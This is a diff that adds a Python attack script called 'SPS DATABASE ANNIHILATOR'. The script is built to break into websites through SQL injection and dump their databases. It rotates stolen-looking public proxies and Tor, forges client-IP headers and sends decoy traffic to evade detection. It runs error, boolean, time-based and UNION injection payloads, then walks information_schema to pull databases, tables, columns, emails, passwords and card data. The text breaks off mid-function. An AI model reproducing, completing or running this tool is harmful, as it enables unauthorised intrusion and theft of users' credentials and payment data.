@@ -1,0 +1,449 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+# ==============================================================================
+# SPS DATABASE ANNIHILATOR - Ultimate Database Extraction Framework
+# SQLi (Error+Boolean+Time+Union+Stacked) | XSS | LFI | IDOR | GraphQL
+# Config Leak | Exposed API | Default Creds | WAF Bypass
+# 9 طبقات حماية | 50 مصدر بروكسي | Tor | DNS/HTTPS | تشويش
+# ==============================================================================
+import os, sys, time, random, threading, json, requests, subprocess, socket, struct, ssl, hashlib, string, re, base64, secrets, logging, signal, atexit, sqlite3
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from urllib.parse import urlparse, urlencode, quote, unquote
+from datetime import datetime
+from collections import defaultdict
+from typing import Optional, List, Dict, Tuple, Any
+import urllib3; urllib3.disable_warnings()
+
+# ===== COLORS =====
+G = '\033[1;32m'; R = '\033[1;31m'; Y = '\033[1;33m'; C = '\033[1;36m'
+P = '\x1b[38;5;204m'; W = '\033[1;37m'; B = '\033[1;34m'; X = '\033[0m'
+
+SHUTDOWN = threading.Event()
+ALL_SOCKETS: List[socket.socket] = []
+
+def graceful_shutdown(signum=None, frame=None):
+    SHUTDOWN.set()
+    for s in ALL_SOCKETS:
+        try: s.close()
+        except: pass
+    sys.exit(0)
+signal.signal(signal.SIGINT, graceful_shutdown)
+signal.signal(signal.SIGTERM, graceful_shutdown)
+
+# ===== SAFE IMPORT =====
+def safe_import(module_name, pip_name=None, attr=None):
+    try:
+        mod = __import__(module_name)
+        if attr:
+            for part in attr.split('.'): mod = getattr(mod, part)
+        return mod
+    except:
+        try:
+            subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name or module_name, "-q"],
+                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            mod = __import__(module_name)
+            if attr:
+                for part in attr.split('.'): mod = getattr(mod, part)
+            return mod
+        except: return None
+
+socks = safe_import('socks', 'PySocks')
+
+# ===== CONFIG =====
+class Config:
+    THREADS = 50
+    TIMEOUT = 10
+    PROXIES = []
+    PROXY_INDEX = 0
+    PROXY_LOCK = threading.Lock()
+    TOR_AVAILABLE = False
+    TOR_CHECKED = False
+
+# ===== TOR CHECK =====
+def check_tor():
+    if Config.TOR_CHECKED: return Config.TOR_AVAILABLE
+    Config.TOR_CHECKED = True
+    try:
+        s = requests.Session()
+        s.proxies = {'http': 'socks5h://127.0.0.1:9050', 'https': 'socks5h://127.0.0.1:9050'}
+        r = s.get('https://check.torproject.org/api/ip', timeout=5)
+        if r.status_code == 200 and r.json().get('IsTor'):
+            Config.TOR_AVAILABLE = True
+            return True
+    except: pass
+    return False
+
+# ===== PROXY MANAGER (50 مصادر) =====
+class ProxyManager:
+    SOURCES = [
+        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all&anonymity=elite",
+        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all&anonymity=anonymous",
+        "https://www.proxy-list.download/api/v1/get?type=socks5",
+        "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt",
+        "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt",
+        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
+        "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
+        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
+        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks4.txt",
+        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
+        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
+        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt",
+        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
+        "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt",
+        "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
+        "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5.txt",
+        "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS.txt",
+        "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTP.txt",
+        "https://raw.githubusercontent.com/ALIILAPRO/Proxy/main/socks5.txt",
+        "https://raw.githubusercontent.com/ALIILAPRO/Proxy/main/http.txt",
+        "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/socks5/socks5.txt",
+        "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/http/http.txt",
+        "https://raw.githubusercontent.com/prxchk/proxy-list/main/socks5.txt",
+        "https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt",
+        "https://raw.githubusercontent.com/yuceltoluyag/GoodProxy/main/socks5.txt",
+        "https://spys.me/socks.txt",
+        "https://spys.me/proxy.txt",
+        "https://openproxylist.xyz/socks5.txt",
+        "https://openproxylist.xyz/http.txt",
+        "https://proxyspace.pro/socks5.txt",
+        "https://proxyspace.pro/http.txt",
+    ]
+
+    def __init__(self, target=100):
+        self.proxies: List[Dict] = []
+        self.target = target
+        self.lock = threading.RLock()
+        self.idx = 0
+        self.blacklist: set = set()
+        self.stats = {'fetched': 0, 'alive': 0, 'used': 0, 'ok': 0, 'bad': 0}
+        self._ready = threading.Event()
+        t = threading.Thread(target=self._init, daemon=True)
+        t.start()
+        self._ready.wait(timeout=25)
+
+    def _init(self):
+        self.refresh()
+        self._ready.set()
+
+    def _fetch(self):
+        s = set()
+        for url in self.SOURCES:
+            try:
+                r = requests.get(url, timeout=10, headers={'User-Agent': 'Mozilla/5.0'})
+                if r.status_code == 200:
+                    for line in r.text.strip().split('\n'):
+                        line = line.strip()
+                        if ':' in line and not line.startswith('#') and len(line) < 35:
+                            m = re.search(r'(\d+\.\d+\.\d+\.\d+:\d+)', line)
+                            if m: s.add(m.group(1))
+            except: pass
+        return list(s)
+
+    def _test_one(self, addr):
+        if addr in self.blacklist: return None
+        if not socks: return None
+        try:
+            prox = {'http': f'socks5://{addr}', 'https': f'socks5://{addr}'}
+            r = requests.get('https://httpbin.org/ip', proxies=prox, timeout=5, verify=False)
+            if r.status_code == 200:
+                return {'addr': addr, 'alive': True, 'fails': 0, 'latency': r.elapsed.total_seconds()}
+        except: pass
+        return None
+
+    def refresh(self):
+        raw = self._fetch()
+        self.stats['fetched'] += len(raw)
+        exist = {p['addr'] for p in self.proxies}
+        new = [a for a in raw if a not in exist and a not in self.blacklist]
+        if not new: return
+        valid = []
+        with ThreadPoolExecutor(max_workers=500) as ex:
+            futs = {ex.submit(self._test_one, a): a for a in new}
+            try:
+                for f in as_completed(futs, timeout=6):
+                    try:
+                        r = f.result(timeout=0)
+                        if r: valid.append(r)
+                    except: pass
+            except TimeoutError:
+                for f in futs: f.cancel()
+        valid.sort(key=lambda x: x['latency'])
+        with self.lock:
+            self.proxies = [p for p in self.proxies if p['alive']]
+            ex_set = {p['addr'] for p in self.proxies}
+            for p in valid:
+                if p['addr'] not in ex_set:
+                    self.proxies.append(p)
+                    ex_set.add(p['addr'])
+            if len(self.proxies) > self.target * 2:
+                self.proxies = self.proxies[:self.target * 2]
+        self.stats['alive'] = self.count
+
+    def get(self) -> Optional[Dict]:
+        with self.lock:
+            alive = [p for p in self.proxies if p['alive']]
+            if not alive:
+                self.refresh()
+                alive = [p for p in self.proxies if p['alive']]
+                if not alive: return None
+            p = alive[self.idx % len(alive)]
+            self.idx += 1
+            self.stats['used'] += 1
+            return p
+
+    def mark_ok(self, addr):
+        with self.lock:
+            for p in self.proxies:
+                if p['addr'] == addr: p['fails'] = 0
+        self.stats['ok'] += 1
+
+    def mark_bad(self, addr):
+        with self.lock:
+            for p in self.proxies:
+                if p['addr'] == addr:
+                    p['fails'] = p.get('fails', 0) + 1
+                    if p['fails'] >= 3:
+                        p['alive'] = False
+                        self.blacklist.add(addr)
+                    break
+        self.stats['bad'] += 1
+
+    @property
+    def count(self):
+        with self.lock: return len([p for p in self.proxies if p['alive']])
+
+# ===== IP SPOOFER =====
+class IPSpoofer:
+    def __init__(self):
+        self.sock = None
+        try:
+            self.sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
+            self.sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+            ALL_SOCKETS.append(self.sock)
+        except: pass
+
+    def spoof_ip(self):
+        return f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"
+
+    def generate_headers(self):
+        return {
+            'X-Forwarded-For': self.spoof_ip(),
+            'X-Real-IP': self.spoof_ip(),
+            'X-Client-IP': self.spoof_ip(),
+            'CF-Connecting-IP': self.spoof_ip(),
+            'True-Client-IP': self.spoof_ip(),
+        }
+
+# ===== UA ROTATOR =====
+class UARotator:
+    AGENTS = [
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0.0.0 Safari/537.36',
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/125.0.0.0 Safari/537.36',
+        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.5 Safari/605.1.15',
+        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.4 Safari/605.1.15',
+        'Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0',
+        'Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0',
+        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 Version/17.4 Mobile/15E148 Safari/604.1',
+        'Mozilla/5.0 (iPad; CPU OS 17_5 like Mac OS X) AppleWebKit/605.1.15 Version/17.4 Mobile/15E148 Safari/604.1',
+        'Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 Chrome/126.0.6478.122 Mobile Safari/537.36',
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edg/126.0.0.0 Safari/537.36',
+    ]
+    @classmethod
+    def get(cls): return random.choice(cls.AGENTS)
+
+# ===== HEADER ROTATOR =====
+class HeaderRotator:
+    LANGUAGES = ['en-US,en;q=0.9', 'en-GB,en;q=0.8', 'fr-FR,fr;q=0.9', 'de-DE,de;q=0.9', 'es-ES,es;q=0.9', 'ar-SA,ar;q=0.9']
+    ENCODINGS = ['gzip, deflate, br', 'gzip, deflate', 'br, gzip, deflate']
+    CACHES = ['no-cache', 'max-age=0', 'no-store', 'no-cache, no-store']
+    REFERRERS = ['https://www.google.com/', 'https://www.bing.com/', 'https://duckduckgo.com/', '', '', '']
+
+    @classmethod
+    def generate(cls, spoof_headers=None):
+        h = {
+            'User-Agent': UARotator.get(),
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
+            'Accept-Language': random.choice(cls.LANGUAGES),
+            'Accept-Encoding': random.choice(cls.ENCODINGS),
+            'Cache-Control': random.choice(cls.CACHES),
+            'Connection': 'keep-alive',
+            'Sec-Fetch-Dest': random.choice(['document', 'empty']),
+            'Sec-Fetch-Mode': random.choice(['navigate', 'cors']),
+            'Sec-Fetch-Site': random.choice(['none', 'cross-site', 'same-origin']),
+            'DNT': '1',
+        }
+        if spoof_headers: h.update(spoof_headers)
+        ref = random.choice(cls.REFERRERS)
+        if ref: h['Referer'] = ref
+        return h
+
+# ===== DNS OVER HTTPS =====
+class DNSSafe:
+    DOH = ['https://cloudflare-dns.com/dns-query', 'https://dns.google/resolve', 'https://dns.quad9.net/dns-query']
+    def __init__(self):
+        self.cache = {}
+        self.lock = threading.Lock()
+    def resolve(self, host):
+        with self.lock:
+            if host in self.cache: return self.cache[host]
+        for url in self.DOH:
+            try:
+                r = requests.get(url, params={'name': host, 'type': 'A'}, headers={'Accept': 'application/dns-json'}, timeout=3)
+                if r.status_code == 200:
+                    for a in r.json().get('Answer', []):
+                        if a.get('type') == 1:
+                            ip = a['data']
+                            with self.lock: self.cache[host] = ip
+                            return ip
+            except: pass
+        return None
+
+# ===== TRAFFIC OBFUSCATOR =====
+class TrafficObfuscator:
+    DECOYS = ['https://www.google.com', 'https://www.youtube.com', 'https://www.facebook.com',
+              'https://www.wikipedia.org', 'https://www.reddit.com', 'https://www.amazon.com',
+              'https://www.github.com', 'https://www.stackoverflow.com']
+    def __init__(self, pm: ProxyManager):
+        self.pm = pm
+    def start(self, count=2):
+        for _ in range(count):
+            t = threading.Thread(target=self._worker, daemon=True)
+            t.start()
+    def _worker(self):
+        time.sleep(random.uniform(1, 3))
+        while not SHUTDOWN.is_set():
+            try:
+                p = self.pm.get()
+                if not p: time.sleep(2); continue
+                prox = {'http': f"socks5://{p['addr']}", 'https': f"socks5://{p['addr']}"}
+                requests.get(random.choice(self.DECOYS), proxies=prox, timeout=5, verify=False)
+                self.pm.mark_ok(p['addr'])
+                time.sleep(random.uniform(2, 8))
+            except: pass
+
+# ===== SQL INJECTION DETECTOR (ALL TYPES) =====
+class SQLiDetector:
+    ERROR_PATTERNS = [
+        r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"MySQLSyntaxErrorException",
+        r"valid MySQL result", r"PostgreSQL.*ERROR", r"Warning.*\Wpg_.*",
+        r"SQLite/JDBCDriver", r"SQLite\.Exception", r"System\.Data\.SQLite",
+        r"Microsoft OLE DB.*SQL Server", r"Driver.* SQL Server",
+        r"SQLServer JDBC Driver", r"Oracle error", r"Oracle.*Driver",
+        r"Warning.*\Woci_.*", r"Warning.*\Wora_.*",
+        r"quoted string not properly terminated", r"unclosed quotation mark",
+        r"you have an error in your sql syntax",
+    ]
+
+    ERROR_PAYLOADS = ["'", '"', "')", '")', "'))", '"))',
+                      "' OR '1'='1", "' OR 1=1--", "' OR 1=1#"]
+    BOOLEAN_PAYLOADS = [("1' AND '1'='1", "1' AND '1'='2"), ("1 AND 1=1", "1 AND 1=2")]
+    TIME_PAYLOADS = ["'; WAITFOR DELAY '00:00:05'--", "' AND SLEEP(5)--", "' AND SLEEP(5)#"]
+    UNION_PAYLOADS = [f"' UNION SELECT {','.join(['NULL']*i)}--" for i in range(1, 11)]
+
+    @staticmethod
+    def detect(http, url):
+        results = []
+        base = url if '=' in url else url + '?id=1'
+        
+        for payload in SQLiDetector.ERROR_PAYLOADS[:6]:
+            test = base.replace('=1', '=' + quote(payload)) if '=1' in base else base + quote(payload)
+            resp = http.get(test)
+            if resp:
+                for pat in SQLiDetector.ERROR_PATTERNS:
+                    if re.search(pat, resp.text, re.I):
+                        results.append({'type': 'error', 'payload': payload, 'db': SQLiDetector._identify(resp.text)})
+                        break
+        
+        for tp, fp in SQLiDetector.BOOLEAN_PAYLOADS[:1]:
+            turl = base.replace('=1', '=' + quote(tp))
+            furl = base.replace('=1', '=' + quote(fp))
+            r1 = http.get(turl); r2 = http.get(furl)
+            if r1 and r2 and abs(len(r1.text) - len(r2.text)) > 100:
+                results.append({'type': 'boolean', 'payload': tp})
+        
+        for payload in SQLiDetector.TIME_PAYLOADS[:1]:
+            turl = base.replace('=1', '=' + quote(payload))
+            t0 = time.time(); http.get(turl)
+            if time.time() - t0 > 4:
+                results.append({'type': 'time', 'payload': payload})
+        
+        for payload in SQLiDetector.UNION_PAYLOADS[:3]:
+            turl = base.replace('=1', '=' + quote(payload))
+            resp = http.get(turl)
+            if resp and 'error' not in resp.text.lower() and len(resp.text) > 200:
+                results.append({'type': 'union', 'payload': payload, 'cols': payload.count('NULL')})
+        
+        return results
+
+    @staticmethod
+    def _identify(text):
+        if re.search(r'mysql|MariaDB', text, re.I): return 'MySQL'
+        if re.search(r'postgresql|pg_', text, re.I): return 'PostgreSQL'
+        if re.search(r'sqlite', text, re.I): return 'SQLite'
+        if re.search(r'mssql|sql server', text, re.I): return 'MSSQL'
+        if re.search(r'oracle|ora-', text, re.I): return 'Oracle'
+        return 'Unknown'
+
+# ===== DATABASE EXTRACTOR =====
+class DatabaseExtractor:
+    def __init__(self, http, url, vuln):
+        self.http = http
+        self.url = url
+        self.vuln = vuln
+        self.db_type = vuln.get('db', 'MySQL')
+        self.base = url if '=' in url else url + '?id=1'
+        self.results_dir = f"db_dump_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
+        os.makedirs(self.results_dir, exist_ok=True)
+        self.col_count = vuln.get('cols', 0)
+        self.data = {'databases': {}, 'emails': [], 'passwords': [], 'cards': [], 'users': []}
+
+    def _inject(self, payload):
+        url = self.base.replace('=1', '=' + quote(payload)) if '=1' in self.base else self.base + quote(payload)
+        return self.http.get(url, timeout=15)
+
+    def detect_columns(self):
+        if self.col_count > 0: return self.col_count
+        for i in range(1, 20):
+            payload = f"' UNION SELECT {','.join(['NULL']*i)}--"
+            resp = self._inject(payload)
+            if resp and 'error' not in resp.text.lower():
+                self.col_count = i
+                return i
+        return 0
+
+    def extract_databases(self):
+        nulls = ','.join(['NULL']*(self.col_count-1))
+        dbs = []
+        for i in range(20):
+            payload = f"' UNION SELECT schema_name,{nulls} FROM information_schema.schemata LIMIT {i},1--"
+            resp = self._inject(payload)
+            if resp:
+                m = re.search(r'([a-zA-Z0-9_]{2,30})', resp.text[:500])
+                if m: dbs.append(m.group(1))
+        return list(set(dbs))
+
+    def extract_tables(self, db):
+        nulls = ','.join(['NULL']*(self.col_count-1))
+        tables = []
+        for i in range(200):
+            payload = f"' UNION SELECT table_name,{nulls} FROM information_schema.tables WHERE table_schema='{db}' LIMIT {i},1--"
+            resp = self._inject(payload)
+            if resp:
+                m = re.search(r'([a-zA-Z0-9_]{2,40})', resp.text[:500])
+                if m: tables.append(m.group(1))
+        return tables
+
+    def extract_columns(self, db, table):
+        nulls = ','.join(['NULL']*(self.col_count-1))
+        cols = []
+        for i in range(100):
+            payload = f"' UNION SELECT column_name,{nulls} FROM information_schema.columns WHERE table_schema='{db}' AND table_name='{table}' LIMIT {i},1--"
+            resp = self._inject(payload)
+            if resp:
+                m = re.search(r'([a-zA-Z0-9_]{2,30})', resp.text[:500])
+                if m: cols.append(m.group(1))
+        return cols
+
+    def extract_data_batch(self, db, table, cols, offset=0, limit=50):
+        if len(cols) > self.col_count - 1:
+            cols = cols[:self.col_count-1
